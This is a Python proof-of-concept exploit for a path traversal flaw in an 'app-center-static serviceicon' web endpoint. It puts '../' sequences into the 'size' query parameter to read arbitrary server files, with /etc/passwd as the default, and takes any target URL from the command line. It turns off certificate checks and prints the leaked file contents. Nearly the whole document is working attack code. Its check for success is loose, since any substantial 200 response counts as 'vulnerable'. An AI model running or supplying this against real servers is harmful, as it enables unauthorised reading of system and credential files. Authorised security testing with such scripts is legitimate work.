#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE POC - Path Traversal Vulnerability
Target: app-center-static serviceicon endpoint
Vulnerability: Directory traversal via 'size' parameter
"""

import requests
import argparse
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_vuln(target_url, file_path=None):
    """Test path traversal vulnerability"""
    
    traversal = "../" * 4
    if file_path:
        traversal += file_path.lstrip("/")
    
    payload_path = "/app-center-static/serviceicon/myapp/%7B0%7D/"
    
    params = {"size": traversal}
    
    full_url = urljoin(target_url, payload_path)
    
    try:
        resp = requests.get(
            full_url,
            params=params,
            timeout=10,
            verify=False
        )
        
        # Check for directory listing indicators
        indicators = [
            "<title>Index of",
            "Parent Directory",
            "bin/",
            "etc/",
            "usr/",
            "Windows/",
            "Program Files"
        ]
        
        for indicator in indicators:
            if indicator in resp.text:
                return True, resp.text[:2000], resp.status_code
        
        # Also check if we got a 200 with substantial content
        if resp.status_code == 200 and len(resp.text) > 100:
            return True, resp.text[:2000], resp.status_code
            
        return False, resp.text[:500], resp.status_code
        
    except requests.RequestException as e:
        return False, str(e), 0


def main():
    parser = argparse.ArgumentParser(
        description="Path Traversal / Arbitrary File Read Vulnerability POC"
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL (e.g., http://example.com)"
    )
    parser.add_argument(
        "-f", "--file",
        type=str,
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    args = parser.parse_args()
    
    target = args.url.rstrip("/")
    
    print(f"[*] Target: {target}")
    print(f"[*] File: {args.file}")
    print(f"[*] Testing path traversal vulnerability...")
    print(f"[*] Payload: ?size=../../../../{args.file.lstrip('/')}")
    
    is_vuln, response, status_code = check_vuln(target, args.file)
    
    print(f"[*] Status Code: {status_code}")
    
    if is_vuln:
        print("[+] VULNERABLE - Path traversal detected!")
        print("[+] Response preview:")
        print("-" * 50)
        print(response)
        print("-" * 50)
    else:
        print("[-] Not vulnerable or target unreachable")
        if response:
            print(f"[-] Response: {response[:200]}")


if __name__ == "__main__":
    main()
